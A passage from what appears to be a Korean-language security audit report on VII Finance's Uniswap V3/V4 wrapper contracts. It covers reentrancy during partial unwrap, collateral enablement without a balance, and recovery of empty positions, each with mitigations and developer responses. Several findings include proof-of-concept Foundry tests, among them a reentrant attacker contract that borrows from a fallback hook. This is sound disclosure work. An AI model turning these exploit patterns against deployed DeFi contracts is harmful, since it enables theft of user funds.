이는 `callThroughEVC()` 수정자가 적용되었음에도 불구하고 가능합니다. 실행은 결국 `nonReentrantChecksAndControlCollateral()` 수정자가 적용된 `EthereumVaultConnector::call`로 끝납니다. 그러나 이 시점에서 제어 담보(control collateral)가 진행 중이 아니므로 체크는 실행 컨텍스트 내에서 연기되며, 이는 수정자 내의 되돌리기(revert)를 우회할 수 있음을 의미합니다:

```solidity
/// @notice A modifier that verifies whether account or vault status checks are re-entered as well as checks for
/// controlCollateral re-entrancy.
modifier nonReentrantChecksAndControlCollateral() {
    {
        EC context = executionContext;

        if (context.areChecksInProgress()) {
            revert EVC_ChecksReentrancy();
        }

        if (context.isControlCollateralInProgress()) {
            revert EVC_ControlCollateralReentrancy();
        }
    }

    _;
}
```

**영향:** Uniswap V4가 DeFi 프로토콜 전반에서 담보로 일반적으로 사용되는 네이티브 ETH를 지원하므로 이 문제의 가능성은 중간/높음입니다. 영향은 정량화하기 더 어려운데, ERC-6909 소각 후 `E_AccountLiquidity()`로 인한 지연된 체크에서의 되돌리기로 인해 담보 부족 대출에 대한 볼트 보호를 우회하거나 ERC-6909 회계를 깨뜨리기 위해 이 재진입을 활용하는 것이 불가능해 보이기 때문입니다. 재귀적 부분 언랩 또한 공격자에게 수익성이 없는 것으로 보입니다.

**PoC (Proof of Concept):** 다음 패치를 적용하고 `forge test --mt test_reentrancyPoC -vvv`를 실행하십시오:

```diff
---
 .../test/uniswap/UniswapV4Wrapper.t.sol       | 95 ++++++++++++++++++-
 1 file changed, 94 insertions(+), 1 deletion(-)

diff --git a/vii-finance-smart-contracts/test/uniswap/UniswapV4Wrapper.t.sol b/vii-finance-smart-contracts/test/uniswap/UniswapV4Wrapper.t.sol
index 2fce3ed..d9eaf45 100644
--- a/vii-finance-smart-contracts/test/uniswap/UniswapV4Wrapper.t.sol
+++ b/vii-finance-smart-contracts/test/uniswap/UniswapV4Wrapper.t.sol
@@ -40,6 +40,46 @@ import {UniswapMintPositionHelper} from "src/uniswap/periphery/UniswapMintPositi
 import {ActionConstants} from "lib/v4-periphery/src/libraries/ActionConstants.sol";
 import {Math} from "lib/openzeppelin-contracts/contracts/utils/math/Math.sol";

+contract ReentrantBorrower {
+    bool entered;
+    ERC721WrapperBase wrapper;
+    uint256 tokenId;
+    IEVault eVault;
+    IEVC evc;
+
+    fallback() external payable {
+        if (!entered && address(wrapper) != address(0) && tokenId != 0 && address(eVault) != address(0)) {
+            console.log("reentrancy");
+            entered = true;
+
+            bool checksInProgress = evc.areChecksInProgress();
+            bool checksDeferred = evc.areChecksDeferred();
+            bool controlCollateralInProgress = evc.isControlCollateralInProgress();
+
+            assert(!checksInProgress);
+            assert(checksDeferred);
+            assert(!controlCollateralInProgress);
+
+            eVault.borrow(type(uint256).max, address(this));
+
+        }
+    }
+
+    function setEnabled(ERC721WrapperBase _wrapper, uint256 _tokenId, IEVault _eVault, IEVC _evc) external {
+        wrapper = _wrapper;
+        tokenId = _tokenId;
+        eVault = _eVault;
+        evc = _evc;
+    }
+}
+
 contract MockUniswapV4Wrapper is UniswapV4Wrapper {
     using StateLibrary for IPoolManager;

@@ -125,7 +165,7 @@ contract UniswapV4WrapperTest is Test, UniswapBaseTest {

     TestRouter public router;

-    bool public constant TEST_NATIVE_ETH = false;
+    bool public constant TEST_NATIVE_ETH = true;

     function deployWrapper() internal override returns (ERC721WrapperBase) {
         currency0 = Currency.wrap(address(token0));
@@ -407,6 +447,59 @@ contract UniswapV4WrapperTest is Test, UniswapBaseTest {
         }
     }

+    function test_reentrancyPoC() public {
+        address attacker = address(new ReentrantBorrower());
+
+        LiquidityParams memory params = LiquidityParams({
+            tickLower: TickMath.MIN_TICK + 1,
+            tickUpper: TickMath.MAX_TICK - 1,
+            liquidityDelta: -19999
+        });
+
+        deal(token0, attacker, 100 * unit0);
+        deal(token1, attacker, 100 * unit1);
+        startHoax(attacker);
+        SafeERC20.forceApprove(IERC20(token0), address(router), type(uint256).max);
+        SafeERC20.forceApprove(IERC20(token1), address(router), type(uint256).max);
+        SafeERC20.forceApprove(IERC20(token0), address(mintPositionHelper), type(uint256).max);
+        SafeERC20.forceApprove(IERC20(token1), address(mintPositionHelper), type(uint256).max);
+        (tokenId,,) = boundLiquidityParamsAndMint(params, attacker);
+
+        startHoax(attacker);
+        wrapper.underlying().approve(address(wrapper), tokenId);
+        wrapper.wrap(tokenId, attacker);
+        wrapper.enableTokenIdAsCollateral(tokenId);
+
+        evc.enableCollateral(attacker, address(wrapper));
+        evc.enableController(attacker, address(eVault));
+
+        console.log("eVault.debtOfExact(attacker) before: %s", eVault.debtOfExact(attacker));
+        console.log("balanceOf(attacker, tokenId) before: %s", wrapper.balanceOf(attacker, tokenId));
+        console.log("balanceOf(attacker) before: %s", wrapper.balanceOf(attacker));
+
+        assertEq(wrapper.balanceOf(attacker, tokenId), wrapper.FULL_AMOUNT());
+        uint256 balanceBefore = wrapper.balanceOf(attacker);
+
+        ReentrantBorrower(payable(attacker)).setEnabled(wrapper, tokenId, eVault, evc);
+
+        wrapper.unwrap(
+            attacker,
+            tokenId,
+            attacker,
+            wrapper.FULL_AMOUNT() * 99/100,
+            bytes("")
+        );
+
+        console.log("eVault.debtOfExact(attacker) after: %s", eVault.debtOfExact(attacker));
+        console.log("balanceOf(attacker, tokenId) after: %s", wrapper.balanceOf(attacker, tokenId));
+        console.log("balanceOf(attacker) after: %s", wrapper.balanceOf(attacker));
+
+        assertEq(wrapper.balanceOf(attacker, tokenId), wrapper.FULL_AMOUNT() / 100);
+        assertGt(balanceBefore, wrapper.balanceOf(attacker));
+    }
+
     function testSkim() public {
         LiquidityParams memory params = LiquidityParams({
             tickLower: TickMath.MIN_TICK + 1,
--
2.40.0

```

**권장되는 완화 방법:** 명확하고 실질적인 공격을 식별하는 것은 불가능했지만, LP 수수료 이체 실행 중 수행되는 안전하지 않은 외부 호출이 래퍼 계약으로 다시 호출되는 것을 방지하기 위해 재진입 가드(reentrancy guard) 적용을 고려하는 것이 좋습니다.

**VII Finance:** 커밋 [88c9eec](https://github.com/kankodu/vii-finance-smart-contracts/commit/88c9eec6af4db1aaf7ddbd6d5fdd8a0cc0b65d93)에서 수정되었습니다.

**Cyfrin:** 확인되었습니다. 재진입을 유발할 수 있는 이체는 이제 ERC-6909 토큰이 소각된 후 부분 언랩의 끝에서 발생합니다.


### ERC-6909 공급량을 전혀 소유하지 않아도 `tokenIds`를 담보로 활성화할 수 있음

**설명:** 사용자가 소유하지 않은 `tokenIds`를 담보로 활성화하는 것이 가능합니다. 현재 수정된 로직에 따르면, H-02에 설명된 `ERC721WrapperBase::normalizedToFull`의 잘못된 구현으로 인한 C-01에 설명된 청산 차단 이상으로 이것이 무기화되는 것은 불가능해 보입니다. 그렇긴 하지만, 차입자가 ERC-6909 잔고가 0인 `tokenId`를 담보로 추가할 수 있는 이 기능은 명시적으로 금지되어야 합니다. 이미 포지션의 지분을 소유하고 있지 않지만 계정 유동성 체크를 통과하기 위해 `tokenId`를 담보로 활성화해야 하는 청산인은 EVC 배치 호출의 지연된 체크를 활용하여 여전히 그렇게 할 수 있어야 합니다.

**영향:** 차입자는 기초 ERC-6909 잔고를 전혀 소유하지 않더라도 자유롭게 `tokenIds`를 담보로 활성화할 수 있습니다.

**PoC (Proof of Concept):**
```solidity
function test_enableCollateralPoC() public {
    LiquidityParams memory params = LiquidityParams({
        tickLower: TickMath.MIN_TICK + 1,
        tickUpper: TickMath.MAX_TICK - 1,
        liquidityDelta: -19999
    });

    (tokenId,,) = boundLiquidityParamsAndMint(params, borrower);

    startHoax(borrower);
    wrapper.underlying().approve(address(wrapper), tokenId);
    // avoid wrapping such that ERC-6909 total supply remains zero
    assertEq(wrapper.totalSupply(tokenId), 0);

    address borrower2 = makeAddr("borrower2");
    startHoax(borrower2);
    assertEq(wrapper.getEnabledTokenIds(borrower2).length, 0);
    wrapper.enableTokenIdAsCollateral(tokenId);
    assertEq(wrapper.getEnabledTokenIds(borrower2).length, 1);
}
```

**권장되는 완화 방법:** 담보 활성화 시 0이 아닌 ERC-6909 잔고를 요구하는 것을 고려하십시오:

```diff
+   error TokenIdNotOwnedByBorrower(uint256 tokenId, address sender);

    function enableTokenIdAsCollateral(uint256 tokenId) public returns (bool enabled) {
        address sender = _msgSender();
        enabled = _enabledTokenIds[sender].add(tokenId);
        if (totalTokenIdsEnabledBy(sender) > MAX_TOKENIDS_ALLOWED) revert MaximumAllowedTokenIdsReached();
+       if (balanceOf(sender, tokenId) == 0) revert TokenIdNotOwnedByBorrower(tokenId, sender);
        if (enabled) emit TokenIdEnabled(sender, tokenId, true);
    }
```

**VII Finance:** 인지하였습니다. 우리는 너무 제한적이기를 원하지 않습니다. 청산인은 방금 떠안은 부채를 담보화할 준비를 하기 위해 담보로 얻게 될 `tokenIds`를 얻기 전에 활성화하기를 원할 수 있습니다.

**Cyfrin:** 인지하였습니다.


### 부분 언랩 오버로드를 통해 완전히 언랩할 때 기초 유동성 포지션이 이체되지 않음

**설명:** `ERC721WrapperBase` 부분 언랩 오버로드는 부분 청산 후에 사용하도록 의도되었지만, ERC-6909 토큰의 유일한 보유자가 해당 `tokenId`의 총 공급량을 지정하여 전체 언랩을 수행하는 데 이 함수를 사용할 수 있습니다:

```solidity
function unwrap(address from, uint256 tokenId, address to, uint256 amount, bytes calldata extraData)
    external
    callThroughEVC
{
    _unwrap(to, tokenId, amount, extraData);
    _burnFrom(from, tokenId, amount);
}
```

가상의 `_unwrap()`에 구현된 비례 몫 계산이 실행되어 기초 원금 잔고와 LP 수수료를 유일한 보유자에게 이체하고, 전체 ERC-6909 토큰 공급량을 소각하여 래퍼 컨트랙트에 빈 유동성 포지션 NFT를 남깁니다.

이러한 호출 후 ERC-6909 토큰의 총 공급량이 0으로 줄어들었으므로, 해당 빈 포지션의 전체 언랩을 수행하여 포지션을 회수할 수 있습니다:

```solidity
function unwrap(address from, uint256 tokenId, address to) external callThroughEVC {
    _burnFrom(from, tokenId, totalSupply(tokenId));
    underlying.transferFrom(address(this), to, tokenId);
}
```

문제는 0 금액으로 호출된 `_burnFrom()`이 되돌리기(revert) 없이 모든 전송자에 대해 성공하므로 누구나 이를 수행할 수 있다는 것입니다:

```solidity
// ERC721WrapperBase
function _burnFrom(address from, uint256 tokenId, uint256 amount) internal {
    address sender = _msgSender();
    if (from != sender && !isOperator(from, sender)) {
        _spendAllowance(from, sender, tokenId, amount);
    }
    _burn(from, tokenId, amount);
}

// ERC6909
function _burn(address from, uint256 id, uint256 amount) internal {
    if (from == address(0)) {
        revert ERC6909InvalidSender(address(0));
    }
    _update(from, address(0), id, amount);
}

// ERC721WrapperBase
function _update(address from, address to, uint256 id, uint256 amount) internal virtual override {
    super._update(from, to, id, amount);
    if (from != address(0)) evc.requireAccountStatusCheck(from);
}

// ERC6909
function _update(address from, address to, uint256 id, uint256 amount) internal virtual {
    address caller = _msgSender();

    if (from != address(0)) {
        uint256 fromBalance = _balances[from][id];
        if (fromBalance < amount) {
            revert ERC6909InsufficientBalance(from, fromBalance, amount, id);
        }
        unchecked {
            // Overflow not possible: amount <= fromBalance.
            _balances[from][id] = fromBalance - amount;
        }
    }
    if (to != address(0)) {
        _balances[to][id] += amount;
    }

    emit Transfer(caller, from, to, id, amount);
}
```

이런 방식으로 포지션을 언랩한 사용자는 자신의 NFT를 다른 계정에 의해 회수되거나 소각당할 수 있으며, 동일한 `tokenId`를 다시 발행하는 것이 불가능할 것이기 때문에 바람직하지 않을 수 있습니다.

**영향:** 부분 언랩 오버로드를 통한 전체 언랩 후 래퍼 컨트랙트에 남아 있는 빈 Uniswap V4 포지션은 다른 전송자가 후속 전체 언랩 및 재랩핑을 호출하여 회수하고 재사용할 수 있습니다.

**PoC (Proof of Concept):**
```solidity
function test_unwrapPoC() public {
    LiquidityParams memory params = LiquidityParams({
        tickLower: TickMath.MIN_TICK + 1,
        tickUpper: TickMath.MAX_TICK - 1,
        liquidityDelta: -19999
    });

    (uint256 tokenId1,,) = boundLiquidityParamsAndMint(params);

    startHoax(borrower);

    // 1. borrower wraps tokenId1
    wrapper.underlying().approve(address(wrapper), tokenId1);
    wrapper.wrap(tokenId1, borrower);

    // 2. borrow fully unwraps via partial unwrap
    wrapper.unwrap(
        borrower,
        tokenId1,
        borrower,
        wrapper.FULL_AMOUNT(),
        bytes("")
    );

    // 3. borrower retrieves the empty position via full unwrap
    wrapper.unwrap(
        borrower,
        tokenId1,
        borrower
    );

    // 4. borrower re-wraps the position
    wrapper.underlying().approve(address(wrapper), tokenId1);
    wrapper.wrap(tokenId1, borrower);
}
```

**권장되는 완화 방법:** 부분 언랩 후 주어진 ERC-6909 토큰의 총 공급량이 0으로 줄어들면, 기초 NFT도 수령인에게 이체하는 것을 고려하십시오.

**VII Finance:** 인지하였습니다. 언랩 종료 시 `tokenId`의 총 공급량이 0이면 가치가 0이라는 것을 알 수 있습니다. 그 이후의 `tokenId`에 대해서는 신경 쓰지 않습니다.

**Cyfrin:** 인지하였습니다.

\clearpage
## 정보성 (Informational)


### 추가 데이터(extra data)는 길이가 정확히 96바이트일 때만 디코딩되어야 함

**설명:** 유동성을 감소시킬 때, `UniswapV3Wrapper`와 `UniswapV4Wrapper` 모두 0이 아닌 길이를 가진 경우 추가 데이터를 디코딩할 수 있다고 가정합니다:

```solidity
// UniswapV3Wrapper usage
(uint256 amount0Min, uint256 amount1Min, uint256 deadline) =
        extraData.length > 0 ? abi.decode(extraData, (uint256, uint256, uint256)) : (0, 0, block.timestamp);

// UniswapV4Wrapper usage
(uint128 amount0Min, uint128 amount1Min, uint256 deadline) = _decodeExtraData(extraData);

function _decodeExtraData(bytes calldata extraData)
    internal
    view
    returns (uint128 amount0Min, uint128 amount1Min, uint256 deadline)
{
    if (extraData.length > 0) {
        (amount0Min, amount1Min, deadline) = abi.decode(extraData, (uint128, uint128, uint256));
    } else {
        (amount0Min, amount1Min, deadline) = (0, 0, block.timestamp);
    }
}
```

그러나 길이가 예상된 96바이트보다 작으면 부분 언랩 실행이 되돌려지므로(revert) 이것이 엄격하게 사실은 아닙니다. 이 경우 잘못된 길이의 바이트를 디코딩하는 데 영향은 없지만, 되돌리는 것보다 기본값으로 폴백(fallback)하는 것이 더 나을 수 있습니다.

**영향:** 형식이 잘못된 추가 데이터는 부분 언랩을 되돌리게(revert) 합니다.

**권장되는 완화 방법:** 길이가 정확히 96바이트일 때만 추가 데이터를 디코딩하는 것을 고려하십시오.

**VII Finance:** 커밋 [79741ea](https://github.com/kankodu/vii-finance-smart-contracts/commit/79741eae2590c57902f1c7c5361d878b3023202d)에서 수정되었습니다.

**Cyfrin:** 확인되었습니다. 올바른 디코딩을 보장하기 위해 더 엄격한 `extraData` 길이 체크가 추가되었습니다.


### `ERC721WrapperBase`에서 중복된 `Math` import를 제거해야 함

**설명:** OpenZeppelin `Math` 라이브러리가 `ERC721WrapperBase`에서 두 번 import되었으므로 하나의 인스턴스를 제거할 수 있습니다.

**VII Finance:** 커밋 [e60cf39](https://github.com/kankodu/vii-finance-smart-contracts/commit/e60cf39ca4e11eb198e6d65b47803f6bf9cd018c)에서 수정되었습니다.

**Cyfrin:** 확인되었습니다. 중복된 import가 제거되었습니다.

\clearpage
